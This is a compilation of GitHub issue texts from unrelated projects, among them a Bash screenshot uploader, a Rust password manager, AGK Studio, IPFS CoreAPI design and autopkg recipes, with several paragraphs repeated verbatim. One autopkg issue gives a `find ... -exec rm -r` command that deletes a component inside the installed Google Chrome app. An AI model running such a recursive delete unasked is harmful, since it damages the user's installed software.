![image](https://user-images.githubusercontent.com/22987140/52713067-aa48ac00-2f96-11e9-968b-3794bb33a53c.png)

Ich hoffe das ganze ist verständlich erklärt und funktioniert so. Bei Fragen könnt ihr euch gerne an mich @adrianjost wenden. 

  Should we make the editor a fully responsive mobile-support-website?
<---------->
169274152
Where Slop takes one colour option, Slurp takes three and they're in a different format too.

Slop uses decimal RGBA whereas Slurp uses Hex, so we'll need to add some translation layer (or duplicate the config option) to allow for a different selection colour in Wayland.

Slurp has the following [defaults](https://github.com/emersion/slurp/blob/11cdf7795134fbe3fc633c2fe08bf94bfcfcbee6/main.c#L384-L389):
```
    RRGGBBAA
-b #FFFFFF40    Background colour
-c #000000FF    Border colour
-s #00000000    Selection colour
``` Because there's no handling for `--window` in the `shoot_wayland` function. If you fill out the Yad config form and get to the confirmation, there's no way to cancel. Even if you press escape, config will be written by NextShot.

Instead, output should be saved to a variable so that the exit status can be checked and NextShot can bail if needed. Much like the initial config form. Instead of `--file` etc, it'd be nice to have short versions like `-f` for added flexibility.

Should make use of `getopt[s]` which will also make it easier to add extra options later on. If `yad` isn't available and there's no config file, NextShot should generate one automatically after prompting the user. Once created, it should then open it for editing in the default editor.

Something like this:
```bash
if $userSaidYes; then
    echo "$theConfig" > "$_CONFIG_FILE" && $EDITOR "$_CONFIG_FILE"
else
    exit 1
fi
``` Goes without saying, really. We don't want to be blindly uploading a massive `.tar.gz` (for example) and disguising it as a `png` when it's clearly not.

At least until the main pipeline's been rewritten for better error handling, it'd be best to add the check within `parse_opts()`. We can use `file --mime-type <FILEPATH>` to check. Add the `-b` flag and it'll suppress the filename too, which we don't particularly need. NextShot uses some expansions and other syntax (such as `${rename,,}` to lowercase the boolean rename option) that is only available as of Bash v4.

You'd think most systems would be on Bash 4 already, but it might not always be the case. For instance OSX - while not (yet) supported by NextShot - is still running v3 out of the box.

If we detect a system running Bash < 4, NextShot should exit with an error message stating that fact. Currently NextShot only checks for the existence of the config file. As long as it's there, it could be completely empty and NextShot will happily try to run with it.

Add checks using parameter substitution [with error messages](https://www.tldp.org/LDP/abs/html/parameter-substitution.html#EX7) to make sure required options are indeed set before attempting to do anything else. If you kill the script with `^C` during the upload to Nextcloud, it only exits that function.

Instead of NextShot exiting entirely, it continues to attempt sharing even though there's nothing there to share.

To fix this, we need to rework the main pipeline which will also make it easier to abort at other stages earlier in the process. Gotta make them configurable somehow.

Probably enough to add a `selectColour` option to config and use that in place of the current hard-coded values. NextShot uses some expansions and other syntax (such as `${rename,,}` to lowercase the boolean rename option) that is only available as of Bash v4.

You'd think most systems would be on Bash 4 already, but it might not always be the case. For instance OSX - while not (yet) supported by NextShot - is still running v3 out of the box.

If we detect a system running Bash < 4, NextShot should exit with an error message stating that fact. This could either be a runtime argument or an option in the config file.

Runtime would make more sense, but it might also be a good idea to have an option for setting the default in config. This could then be overridden by the runtime argument. Could also affect other GUI file managers, no idea.

When you copy an image in Nautilus/GNOME Files, the result of `xclip -selection c -o` is something like this:
```
x-special/nautilus-clipboard
copy
file:///run/media/dshoreman/data/pictures/foo.jpg
```

To be able to paste from Nautilus we'd need some way of detecting and parsing that syntax. `xclip` doesn't seem to offer any image targets, and none of the given options are obviously distinct:
```sh
$ xclip -selection clipboard -o -t TARGETS
TIMESTAMP
TARGETS
MULTIPLE
text/uri-list
UTF8_STRING
COMPOUND_TEXT
TEXT
STRING
text/plain;charset=utf-8
text/plain
``` To capture screenshots with context menus etc we need to add a delay. An option in config might be nice to have, but probably unnecessary.

For now, we can just add a `--delay` argument that takes an integer (or maybe decimal) value, defaulting to `0`. Then we can do something like
```sh
sleep $(( delay * 1000 )); import ...
``` Gotta make them configurable somehow.

Probably enough to add a `selectColour` option to config and use that in place of the current hard-coded values. Currently the `--file` mode checks for the given file relative to `$PWD`. This is fine when the image is in the same directory, and probably even up a level or two.

However, issues start to arise when passing root-relative paths or paths that go via a symlink. For instance, the following fails:
```
nextshot --file ~/pictures/kitten.jpg
```
because it's looking for `/home/$USER/pictures/kitten.jpg` when actually `pictures` is a symlink to `/var/run/media/$USER/data/pictures`. Goes without saying, really. We don't want to be blindly uploading a massive `.tar.gz` (for example) and disguising it as a `png` when it's clearly not.

At least until the main pipeline's been rewritten for better error handling, it'd be best to add the check within `parse_opts()`. We can use `file --mime-type <FILEPATH>` to check. Add a `--clipboard` option to enable uploading to Nextcloud directly from the system clipboard. Would likely use `xclip -selection c -o` for X11, or `wl-paste` (provided by `wl-clipboard`) for Wayland.

Would be even better if we could simply use `STDIN`:
```sh
# On X11
alias pbpaste="xclip -selection c -o"
pbpaste | nextshot

# On Wayland
wl-paste | nextshot
``` When running NextShot through a keybind, it's impossible to know when the link is ready to be pasted.

Notifications should be added through `libnotify`. A simple "Link copied to clipboard" should be enough.

Could probably use the `insert-link` icon from the spec, but will need to try it out first as there are no examples given.

#### Related

* [Notifications Spec](https://developer.gnome.org/notification-spec)
* [Icon Naming Spec](https://specifications.freedesktop.org/icon-naming-spec/icon-naming-spec-latest.html) ...but it does have some formatting options. Gotta play about with some colours and see what makes it stand out. In particular, the window mode's selection border could be made much more obvious as the default is rather faint.
<---------->
169329753
When passing a name to `get` that doesn't exist, the function that fires the query still returns an `Ok()` so the program doesn't see the difference between a query that returns a result, and one that does. Currently `rustdoc` converts the README to a straight HTML page and throws that in `docs/` its ugly, and we could probably do with something a little better that will still allow the use of the generated API documentation as a part of the site. Adding the ability to build / generate installer packages upon running `make build`.

So far I know of:

- using [`cargo-deb`](https://github.com/mmstick/cargo-deb) to generate a `.deb` for ubuntu/debian.
- using [`cargo-arch`](https://github.com/wdv4758h/cargo-arch/) to generate a package for the AUR.
- using [`cargo-wix`](https://github.com/volks73/cargo-wix) to generate a `.msi` for windows.

Things that need to be taken care of

- [ ] MacOS
- [ ] Publishing the installers to the appropriate places Implement some kind of API & Adaptor scenario to allow backup to multiple cloud storage providers

__Command__
` enkee backup --provider [google,dropbox,s3]`

depending on the value passed to `--provider` the `backup` module will call the `adaptor_x` module.
The following is pseudo code to illustrate the idea.

__backup__

```rust
use adaptor;
use std::collections::HashMap;

pub fn backup_for(provider: string) -> Result {
    let providers - HashMap::new();
    
    // The structure of the map
   // [Command Value, Function To Call]
    providers.insert("s3", adaptor::s3);
    providers.insert("google", adaptor::google);
    providers.insert("dropbbox",adaptor::dropbox);

   // call providers(provider)
}
```

__adaptor__

```rust

pub fn s3(username: string, password: string, bucket_name:string ) -> Result {
   // Take credentials and upload to bucket_name
}

pub fn google(username: string, password: string) -> Result {
   // Take credentials and upload to google drive
}

pub fn dropbox(username: string, password: string) -> Result {
   // Take credentials and upload to dropbox
}
``` Build a web GUI that uses `libenkee` to perform the same operations as the CLI app
inside of a modern web interface. This could lead to some interesting features.

Currently being tracked in [feature/web-gui](https://github.com/jbernsie/enkee/tree/feature/web-gui) branch

- [daemonize](http://knsd.github.io/daemonize/daemonize/index.html)
- [rocket](https://rocket.rs/)

### TODO

- [x] Create `src/bin/web_daemon.rs`
- [x] Add rocket as a dependency
- [x] Create base layout for rocket web app
- [x] Wrap server code in a clap CLI
- [x] Add Sqlite db adapter
- [x] Pass the database file to the server
- [x] Once decrypted, a view loads the records
- [ ] Implement start and stop commands that control the daemon process
- [ ] Put the web GUI behind an compilation flag (cargo feature)
- [ ] Add actual management actions to the GUI Build a web GUI that uses `libenkee` to perform the same operations as the CLI app
inside of a modern web interface. This could lead to some interesting features.

- Authentication / Multi-User
- Sorting passwords in groups
- ?

I picture this working as another binary inside of `src/bin/web.rs` or something of the like. Implement a terminal spinner, or progress bar for the long running operations like `lock` and `unlock` as a part of the backend `libenkee` library.

Then import the module into the command backend like so

```rust
use libenkee::spinner::new_spinner;

fn main() {
  let sp = new_spinner("Some message");
  // fn code goes here
  sp.stop();
}
``` Start adding the information to the wiki and possibly removing _"bulky"_ segments from the README and just point the wiki page instead

- [ ] Building from source
- [ ] Tutorial-esque usage
- [ ] Contributing Information Start adding the information to the wiki and possibly removing _"bulky"_ segments from the README and just point the wiki page instead

- [x] Building from source
- [x] Tutorial-esque usage
- [x] Contributing Information When passing a name to `get` that doesn't exist, the function that fires the query still returns an `Ok()` so the program doesn't see the difference between a query that returns a result, and one that does.

### Affected Commands
- `get` - returns no output, should say "No record found with `name`"
- `delete` - actually says "`name` deleted", should return a simmilar "No record found" message Build a web GUI that uses `libenkee` to perform the same operations as the CLI app
inside of a modern web interface. This could lead to some interesting features.

Currently being tracked in [feature/web-gui](https://github.com/jbernsie/enkee/tree/feature/web-gui) branch

- [daemonize](http://knsd.github.io/daemonize/daemonize/index.html)
- [rocket](https://rocket.rs/)

### TODO

- [x] Create `src/bin/web_daemon.rs`
- [x] Add rocket as a dependency
- [x] Create base layout for rocket web app
- [x] Wrap server code in a clap CLI
- [x] Add Sqlite db adapter
- [x] Pass the database file to the server
- [x] Once decrypted, a view loads the records
- [ ] Implement start and stop commands that control the daemon process
- [ ] Put the web GUI behind an compilation flag (cargo feature)
- [ ] Add actual management actions to the GUI
<---------->
169374419
It's hard to tell which libgit2 objects I ought to free and which get cleaned up as part of freeing other objects. From the following commit it appears that @bssrdf had trouble building the project, and also that some of the libgit2 constants may be deprecated in favor of other names:

https://github.com/bssrdf/gitftp/commit/60bb20ad33dd258a62f0a3d2b44a5a9d4b4295f6 Hello,

Is possible changing this for ssh? only file acess not runing instructions.
Or meybe creating fuse? subject Currently it displays the tree on master, where ever that points at the time of connection.  `ncftpls` sends a flag when requesting a list to recurse through all subdirectories. We can use `git_tree_walk` from libgit2 in this case to go through everything to avoid roundtrips for cd ls cd ls etc. FTP clients can ask what features the server supports. Give them an up to date list. I believe there may be a whitelist of values for this response. Clients are truncating characters from what I'm returning now. The server revwalks to find which ancestral commit introduces the blob for each tree entry, and uses that commit time as modification time for the file. Could add a server option to instead list all files with the same modification time -- that of the latest commit on master. This would use fewer server resources. Note the time and remote address of each action. Use a format that log aggregators understand. Useful for a code forge that wants to use a single instance of the ftp server for exposing many people's repositories. * Do FTP servers usually show local time or UTC?
* Does our revwalking get tripped up by merge commits? It's hard to tell which libgit2 objects I ought to free and which get cleaned up as part of freeing other objects. In git_revparse_single I do some `(git_object **)` casts. Is this portable? Can pointers to different structs be portably casted? * Do FTP servers usually show local time or UTC?
* Does our revwalking get tripped up by merge commits?
<---------->
169455810
Is required is not working on undefined properties, when a value is undefined it's not working gives an error. Is required is not working on undefined properties, when a value is undefined it's not working gives an error.
<---------->
169525482
Hey Stephen,

Very nice package! 🤟I was wondering if there is a possibility to support more server providers? Ploi.io also has webhook support after deployments for example.

Let me know! 🙂 Hey Stephen,

Very nice package! 🤟I was wondering if there is a possibility to support more server providers? Ploi.io also has webhook support after deployments for example.

Let me know! 🙂 Commit payload format was changed in 1.2.0, and `commit_author` is no longer a valid key field name. 

- Remove instances of `commit_author`
- Add documentation describing full payload of commit object Hi there!

This package is just what I was looking for (no need to reinvent this wheel!)🥇
I wondered if it is/can be possible to fix the CS errors that might pop up after the style runner. I could of course try out to help you here in case it needs some work! Commit payload format was changed in 1.2.0, and `commit_author` is no longer a valid key field name. Documentation needs to be updated through out all examples. Hi there!

This package is just what I was looking for (no need to reinvent this wheel!)🥇
I wondered if it is/can be possible to fix the CS errors that might pop up after the style runner. I could of course try out to help you here in case it needs some work!
<---------->
169763273
**Description:**
When we run the debugger, the Auto update checkbox get unchecked and the debugger does not update automatically. As a result, code properties does not update the live debug preview and watched variables also don't get updated in the debugger their value remain 'na' at all times.

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

**Version:**
0.95

Thanks. **Description:**
Currently we can choose only 1 sprite to draw in the scene editor. It would be useful if we could select multiple sprites and the draw mode would pick a random sprite to draw each time.

For example, I am currently trying to draw vegetation in my level which I would like to be random so the player see different type of flowers and rocks randomly mixed. It would be very useful if I could choose multiple vegetation sprites like grass, flowers, rocks and draw them randomly in my scene with one move.

Thanks.

Thanks. **Description:**
Currently when I have the draw mode enabled and draw sprites in the scene editor, I get lots of sprites placed in the scene in a second like 20. It would be nice if I could choose the speed, how many sprites a second I want to place in to the scene when drawing sprites.

For example, I would like to place some vegetation all over the scene so in case the draw mode would place only 1 sprite every 2 seconds that would be enough in this case.
 
So it would be nice if I could set how many sprites in how many seconds I want to draw. Maybe 3 sprites every 1 second or only 1 sprites every 3 seconds...etc

Thanks.

 **Description:**
When Draw mode is enabled and I draw sprites in the scene editor using the left mouse button, the right mouse button does not delete the sprites. I need to select the sprites first and then I can delete either using the Delete key or Delete option but can not delete by using the right mouse button.

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

**Version:**
0.95

Thanks. **Description:**
Currently I can delete only 1 selected item at the time in the scene editor using the Delete key on the keyboard. When I have multiple items selected in the scene editor, the option to Delete is simply not available and also the Delete key on the keyboard does not work. When I have multiple items selected, I do have a third option in the properties panel to delete all selected items, and that works but I think it would be nice to be able to delete using the Delete key because it is the traditional way of doing it in most scene editors.

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

**Version:**
0.95

Thanks.  **Description:**
When I try to broadcast my app over to my Android device, it does not work. The player on the android device remain "unconnected". My PC and the Android device is on the same network and the Player is up to date.

I also tried to set the IP of the Android device manually in the properties, I did use the IP displayed in the Player on my Android device but still doesn't work.

Tried with multiple Android devices running different versions of Android including an Amazon tablet, but nothing.

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

**Version:**
0.95

Thanks. **Description:**
When exporting an APK, it cause the IDE freeze and need to force quit the application. We do get the apk exported though. Other times, I get an error saying failed to write output file, check if the project directory is not in a write protected location, which I did check and it is not write protected.

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

**Version:**
0.95

Thanks. **Description:**
It would be nice if we could setup sprite animations in the sprite properties tab by using either individual images and sprite sheets.

Something similar to this:
![sprite-animation](https://user-images.githubusercontent.com/24738433/58381278-34030f00-7fb3-11e9-808b-a32b772ac783.png)

Also need to be able to set animation properties like, speed and if the animation is looping or not and autoplay or not.

Thanks. **Description:**
I think it would be nice to be able to track development on Trello:
https://trello.com/en-GB

Currently the issues on GitHub are sorted in to groups of "Enhancement" and "Bugs",
Bugs, obviously something must be worked on but there is no way to tell which "Ehancement" is more popular and receive more support and if an "Enhancement" is being worked on or considered to be worked on later. Trello would allow you, the developer to sort ideas (jobs) in to groups for example:

Idea - currently no plan to implement it, it is just an idea
Considered - it is considered to be worked on in the future, have not been decided yet when
Planned this year- it is planned to be worked on this year.
Planned next - it is planned to be the next thing to be worked on
In development - currently in development, expected to come later
Ready for next release - as the title saying, this feature is definitely coming in the next update
Done - the feature has been implemented, case closed

The nice thing about it is that the users would have the ability to VOTE which "idea" or "Planned" feature they would like to see and also have a discussion about it in a nicely organized and friendly environment. So it is benefit both, the developer because Trello make it easy to track what the users need and what is the plan, what is being developed and what is coming up next in the road map and it is all public so the users know what to expect, when to expect it and can also VOTE and have a discussion about each topic publicly to hep the developers decide if it something worth developing and by reading the discussions can get some ideas what way would be the best to implement it that suit most users and use cases.

I can see, many feature requests here on GitHub received no comment from other users and could be difficult to decide if it worth it, if there is enough demand for it and I was wondering of it because GitHub is considered a place traditionally where developers have a discussion. Even if it not the case with AGK Studio, many users may think so.

Trello has been designed in a way that offer a common place for both users and developers to share opinions and provide feedback and guidelines in a simple and organized way by allowing developers to create boards and simply add tickets to boards and move these tickets between boards as an indication what is the current situation and allow users to comment and vote on these tickets.

Thanks.


 **Description:**
Now that we have a scene editor where we can also set some physics properties of our sprites such as physics shape, I think it would be nice if Studio would take this to the next level and allow us to create a custom collision shape by adding and moving polygons around in both code and a visual editor integrated with the scene editor, something similar to this:

<img width="1139" alt="collision-shape-editor" src="https://user-images.githubusercontent.com/24738433/57980013-21ba2b80-7a1d-11e9-9539-a53c3657d24e.png">

The benefit would be that, in some cases a circle, box and polygon shape is just not exactly what we need. 
Here for example, I don't want the wings and the empty space at the bottom left part of the dragon to collide with anything:
![wings](https://user-images.githubusercontent.com/24738433/57980151-0ea85b00-7a1f-11e9-80c4-80168c57d926.png)

Using a custom shape I could create a shape that does not include the wings and the bottom left part of the dragon and using a visual collision shape editor, I could do this with ease using a few mouse click just to drag a few polygons around. 

Thanks.
 ![slash](https://user-images.githubusercontent.com/2679679/69777155-15e0ca80-11f3-11ea-92e4-a1aa8820b062.PNG)
 **Description:**
When I use the 'selectfile' code property to pick a file to use in my project, it is opens the AGK folder and I need to navigate manually to my project folder. Since all assets must be located inside the media folder of the project, I think it would be nice when we select a file it would open the folder of the current project by default and not the folder where AGK is located.

When I choose a file using the code property 'selectfile', it is pick the entire raw path to the file beginning with raw:/home/username/...
In case I decide to share this project with others, the location of the project and the name of the user going to be different and it is going to cause error and inconvenience. 
Since all assets must be located inside the media folder I think it would be nice when we select file using 'selectfile' property it would pick a relative path to the file assuming the file we picked is inside the media folder of our project.
 
For those who need to pick raw path, could have a different code property called 'selectrawfile' maybe for selecting a file that is located outside the project folder and do need a raw path to the file.

**Version:**
0.90

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

Thanks. **Description:**
SQLite is a free and cross-platform SQL database engine that allow us to store and manage data locally on the client side. It is available for all desktop and mobile devices.
Homepage: https://www.sqlite.org/index.html

There are also free and cross-platform database browsers that we can use to create and edit SQLite database files using a graphical user interface like this:
http://sqlitebrowser.org/

I think it would be useful if AGK add support to work with this database file. It would allow us to store and manage content of our applications and games more efficiently than using pure text files by sorting data in to tables and fields inside a single database file and use SQL queries to access and edit from code. SQLite engine also allow us to protect the data with encryption and password in case we would like to prevent the user from editing or view the data from outside the application.

Thanks.
 **Description:**
When using code properties, if I change the value in the IDE it does not update the debug preview on Linux. It does update the code, but not the preview. Need to stop the preview and launch it again to see the changes.

**Version:**
0.90

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

Thanks.
 **Description:**
It seems like on Linux the debugger does not work at all.

- When add a variable to watch list, it does not update, does not display the current value in the watch list. The value is na all the time and I also can not change the value in the watch list.
- When run debug and press break, nothing is happening.
- When select a break point and run debug, the application does break but then even if I press continue or step or step over, step out, nothing is happening the application never continue to execute.
- When I set in the preferences to bring the app to the front when debug, does not work. If I press anything in the IDE while the debug running, the app window get behind the IDE.

**Version:**
0.90

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

Thanks.
  **Description:**
Currently the scene editor define the base screen resolution, window size and window mode independently for each scene in the .scene file and the project in main.agc. As a result in case we change our mind down on the line and would like to change the base resolution and window size and window mode, we need to do this for every single scene one by one and in main.agc.

Ideally we want to apply the same screen and window properties throughout the entire game so I think it would be nice to be able to change these properties of our project globally in the IDE that apply to all scenes and the entire project. 

I think it could be done when we change the base resolution of a scene, it could go through each scene file and main.agc and set the same values for us everywhere. In case someone prefer to set resolution and window props independently for each scene, could have a switch somewhere to set this value globally or not.

**Version:**
0.90

Thanks. **Description:**
As I type in the code editor, I notice a bit of a delay between I press a key down and the character added in the editor. The faster I type the more noticeable. The worst when I delete from the editor a long line using backspace, the code editor slow down so much it is continue to delete for a second or two even after I have released backspace.

**Version:**
0.90

**OS:**
Pop!_OS 18.04 (based on Ubuntu 18.04 with Gnome 3)

Thanks. **Description:**
I would have a few suggestions how to improve the code editor.

**Autocomplete:** I have noticed as we type our commands we get suggestions for auto complete only if what we type is match the beginning of any command. For example if we type 'Get' we get suggestions for all commands beginning with 'Get' but if we type 'Frame', we get nothing because no command begins with 'Frame'. I think it would be useful if we would get a list of commands also that only partially match what we type. For example, when I type 'Frame' I want to see 'GetFrameTime()' command comes up.
It could priorities to begin the list with the ones match the beginning and list the others after.

**Hints:** It is nice if we select a command and press F1 we get a hint in the help window. What I do like however in modern IDE's like Visual Studio and get used to is that when I hover my mouse over any command, I get a hint pop-up explaining what this command does. It doesn't need to explain in detail as the help guide, but only a 1 liner just to help me get the idea what is it for and if I want more info then I can select and press F1.
Also in the autocomplete list, when we select a command, it should display a short hint what the command does

It could help with discovering commands we looking for.

**Parameters:** An other thing I get used to in modern IDE's is that when we hover our mouse over a command we get not only a hint but also what parameters the command accept and if we hover the mouse over a parameter, we get what type that parameter should be and a short hint. For example if a command expect an integer and that integer must be an index value then when we hover the mouse over the parameter it should say something like 'Type: int The index number of a sprite' , "Type: float The new position of sprite"..etc
The IDE should know by the position of the parameter which parameter it is. If the first parameter must be type of int, even if I enter a string if I hover my mouse over, it should tell me it must be an int because it is the first parameter and because the IDE should also know which command it is, it should be able to give me a short hint also for the purpose of this parameter like "index of sprite" or "new X position of sprite"...etc

**Error highlighting:** would be also nice to highlight any errors as we type and tell us exactly what the problem is straight away. It is something that I really like about Visual Studio and even Mono Develop. When we make a mistake, we don't get a generic error message like "does not accept parameter" but we do also get a hint when we hover our mouse over the line with the error telling us exactly what the problem is like "you typed int but expect string did you forget a cast?". VS and MD go even further and offer solutions how to fix the error for example offer to convert int to string. Of course I don't expect all this from the IDE of AGKS but at least that much, to highlight the errors as we type it and when we hover our mouse over try to be a bit more specific about what the error is like "typed int but expect string"

All the above I mentioned could help us to be more productive and more simple to get started with AGKS.

Discussion on the forum:
https://forum.thegamecreators.com/thread/224167

Thanks. **Description:**
I think it would be nice to have some 2D light objects in Studio that we can add to the game especially with the new scene editor.
For example, we could have a property for sprite objects if they are obstacles for light or not and if they cast shadow or not.
Then we could drag and drop light objects in to the scene, set usual properties like color, radius, strength and they could automatically have an effect on the entire screen. We could immediately see the results in the scene or at least in preview and change properties in real-time so no guessing would be required. We could see immediately how our scene looks like with lights.

There are many engines out there do offer some sort of solution for creating 2D lights either dynamic or fake. I think it would be extremely important for Studio to offer as well. If not light objects but at least some solution out of the box to blend sprites that allow us to subtract part of a sprite from a part of another and also able to set strength of subtraction so portion of sprites can be transparent instead of make it completely invisible and blend. With this we could play around and create fake lights of our own.

I would be really happy even with something like a shadow layer that we could turn on and off, that effect the entire screen and some light objects that being subtracted from the shadow layer in the given shape, strength and color. We could also change the color and strength of the shadow. It is not that heavy on resources and can provide some nice results in other engines since the objects would not cast shadow, but the option to enable the option to cast shadow is always welcome.

**Options we should be able to set:**

- Sprite cast shadow or not (obstacle to light or not)
- length of shadow (in case cast shadow enabled)
- Color of shadow
- Strength of shadow
- Color of light
- Strength of light
- Type of light: point or direction
- Radius or length of light

Discussion on the forum:
https://forum.thegamecreators.com/thread/224398

Thanks.
 **Description:**
I think it would be useful to have a 2D path editor built-in to the scene editor so we could design paths and make sprites/objects move on this path to the end, back and forth or random. Something similar to what we have in FPSC and GameGuru.

It would be also nice to have some sort of 2D A* Pathfinding implemented in the engine to allow us to move a sprite from point A to point B at the given speed while they are avoiding obstacles.

More advanced option to be able to set cost of obstacles. It means the path can move through the obstacle but it is going to slow the movement down and the pathfinding going to prefer the obstacle with the lower cost.
For example we could set the mud to be cost of 3, water to be cost of 2 and a log over the river to be cost 1 and a bridge over the river cost 0. So the pathfinding would prefer to use in order 0:bridge, 1:log, 2:water, 3:mud. 
So we could choose if an obstacle have a cost or solid.

**Commands we could have:**

- FindPath(spriteID, startX, startY, targetX, targetY) //return a path ID if path found 0 if no path found
- MoveOnPath(pathID, roation mode, speed)
- EndOfPathReached(spriteID) //return 1 if the sprite reached the end of the path it was following
- IsMovingOnPath(spriteID) //return 1 if the sprite currently moving on path

**Options we need to be able to set:**

- Sprite angle follow rotation, if set to true the sprite always rotate toward the direction of movement.
- Speed of movement on path
- Speed of rotation on path
- Smooth path, if set to true the path must be curved and the sprite can not cut the corners.
- Keep distance to obstacle, if set to true, when pathfinding generate the path it must take in to account the widht and height of the sprite to make sure it does not overlap the obstacles.
- Obstacle is solid or have a cost
- How much the cost of an obstacle slow the speed down using a % system.

Discussion on the forum:
https://forum.thegamecreators.com/thread/224400

Thanks.
<---------->
169782973
- [ ] add defaults for all devices
- [ ] add defaults for controllers
- [ ] add support for notifications
- [ ] add login support
- [ ] system info and system vars
- [ ] improve mobile styles
- [ ] improve error handling
- [ ] add setup page (first connection) - [x] add defaults for all devices [WIP]
- [x] add defaults for controllers
- [x] add support for notifications
- [x] add login support [WIP]
- [x] system info and system vars
- [x] improve mobile styles
- [x] improve error handling
- [x] add setup page (first connection)
- [x] espeasy p2p network status (devices connected)
- [x] documentation
<---------->
169787218
Pulled from autopkg_results.plist

`preinstall script found in .../com.github.sincerelyjoshin.sincerelyjoshin-recipes/GoogleEarthPro/scripts but it is not executable!` Pulled from autopkg_results.plist

`preinstall script found in .../com.github.sincerelyjoshin.sincerelyjoshin-recipes/GoogleEarthPro/scripts but it is not executable!` test to check Trello app_mode_loader.app type flag set to regular file:
`find /Applications/Google\ Chrome.app/ -name "app_mode_loader.app" -type f -exec rm -r "{}" \;`

app_mode_loader.app type flag should be set to directory:
`find /Applications/Google\ Chrome.app/ -name "app_mode_loader.app" -type d -exec rm -r "{}" \;` This is a test to see if new issues display in Trello. app_mode_loader.app type flag set to regular file:
`find /Applications/Google\ Chrome.app/ -name "app_mode_loader.app" -type f -exec rm -r "{}" \;`

app_mode_loader.app type flag should be set to directory:
`find /Applications/Google\ Chrome.app/ -name "app_mode_loader.app" -type d -exec rm -r "{}" \;`
<---------->
169816420
Textile has defined a bunch of helper functions. We should take a look at these helpers and think through any changes we might want to make to the CoreAPI to simplify them.

Code: https://github.com/textileio/go-textile/blob/a7f7c040d2178a5768d4144f33afde38ee2129fd/ipfs/api.go

Looking through this, it looks like the main missing component is MFS support. We should be able to handle this at the cmds (and maybe files) layer and filter hidden files out before they ever reach the CoreAPI. Does this make sense? Currently the `ParsePath` method returns an error, which makes using it a bit verbose:

```
p, err := api.ParsePath("/ipfs/QmThing")
if err != nil {
  [...]
}

_, err := api.Unixfs.Ls(ctx, p)
if err != nil {
  [...]
}
```

We could:
  * Let paths be arbitrary strings (behind an interface, because Go type system..)
  * Provide a `Validate(path) error` method to let users check their paths (also check them in places when it's really needed)
  * Drop `Namespace`/`Mutable` methods from the interface, move to global functions (possibly in a separate package)

This would look roughly like this for users:

```go
_, err := api.Unixfs.Ls(ctx, apipath.New("/ipfs/QmThing")) // checking still happens, but errors are returned from api.Unixfs.Ls
if err != nil {
  [...]
}
```
 - [ ] Readme
- [ ] Description
- [ ] Make this package more visible I think this repo might contain a bit more than just pure interface so moving the interface itself to a directory might be useful.

It will also sort out the directory name vs package name. We currently validate paths after the fact using an `IsValid` method. Unfortunately, this means:

1. To be correct, we may need to validate repeatedly (not free).
2. We don't really get a chance to _normalize_ the path.
3. Most of the `Path` methods don't make much sense unless the path has been validated.

So, I'm thinking we may want to change the path interface to something like:

```go
// Path is the path type passed in by the user. It's unchecked and may be relative to some context.
type Path interface {
  // RelativeTo converts the path to an absolute path. If already absolute, this
  // method just normalizes.
  func RelativeTo(p AbsolutePath) (AbsolutePath, error)

  // RawString returns the path as specified by the user. This is never normalized,
  // made absolute, etc.
  // TODO: Do we need this?
  func RawString() string

  // String returns the string representation of the path.
  func String() string
}

// AbsolutePath is an absolute path to a file.
type AbsolutePath interface {
  Path

  // Segments returns the segments of this normalized path.
  Segments() []string

  // Namespace returns the _namespace_ of this absolute path.
  Namespace() string

  // Having second thoughts on whether `Mutable` belongs here...
}

type ResolvedPath interface {
  AbsolutePath
  // ...
}
```

Thoughts @magik6k? Doesn't seem to be an option today at https://godoc.org/github.com/ipfs/interface-go-ipfs-core#UnixfsAPI Something like `api.Closing() <-chan struct{}`, to have a way to tell when daemon is shutting down, etc. We should be able to handle this at the cmds (and maybe files) layer and filter hidden files out before they ever reach the CoreAPI. Does this make sense? Our datastores can often improve the performance of batched operations. It would be nice if we could have some kind of `Buffered() *BufferedCoreAPI` function on the CoreAPI that returns a _buffered_ CoreAPI with special `Flush()` (and maybe `Close()`) function(s).

This could _also_ be done with transactions but:

1. It may be a while until we get to that point.
2. Transactions need to support Abort.

Thoughts? We could _also_ just add `PutAll` functions but buffering is probably the most friendly solution. Looking to figure out how to use it for:

- Adding a file
- Adding a file with trickle-dag
- Adding a directory
- Adding a directory with sharding

https://github.com/ipfs/interface-go-ipfs-core/blob/master/unixfs.go#L67-L68 We should have a `ResolveComponents(ctx, opts...) <-chan Result` function that resolves a path and returns each component as it's resolved.

Result would be:

```go
type Result struct {
   From Path
   To Path
}
``` The current path type doesn't support _relative_ paths. I'm not sure how best to do this or even if we _want_ to do this but, for now, symlink "targets" will have to just be arbitrary strings. Currently the `ParsePath` method returns an error, which makes using it a bit verbose:

```
p, err := api.ParsePath("/ipfs/QmThing")
if err != nil {
  [...]
}

_, err := api.Unixfs.Ls(ctx, p)
if err != nil {
  [...]
}
```

We could:
  * Let paths be arbitrary strings (behind an interface, because Go type system..)
  * Provide a `Validate(path) error` method to let users check their paths (also check them in places when it's really needed)
  * Drop `Namespace`/`Mutable` methods from the interface, move to global functions (possibly in a separate package)

This would look roughly like this for users:

```go
_, err := api.Unixfs.Ls(ctx, apipath.New("/ipfs/QmThing")) // checking still happens, but errors are returned from api.Unixfs.Ls
if err != nil {
  [...]
}
```
 We _currently_ just list the protocol but it would be nice to include things like direction as well. While working on https://github.com/ipfs/testground/pull/58, I hit myself on a wall: how can we call the Garbage Collector programmatically? While working on https://github.com/ipfs/testground/pull/58, I hit myself on a wall: how can we call the Garbage Collector programmatically? How can we add files to the MFS using this API?

/cc https://github.com/ipfs/interface-go-ipfs-core/issues/48 This question goes along the same lines as #52 and #53. If it's not implemented, I can try to do so. `Put` should take an explicit format.
<---------->
169972846
I want to get its source code instead of binary.

Like:
`s.source_files = "Sources/**/*.{swift}"` public enum Alignment : Int {
    
    
    case center
    
    case left
    
    case right
    
    case fill
    
    @available(iOS 11.0, *)
    case leading
    
    @available(iOS 11.0, *)
    case trailing
}

extension Alignment {// This could not found in ScanResult
    func action() {
        print(self.rawValue)
    }
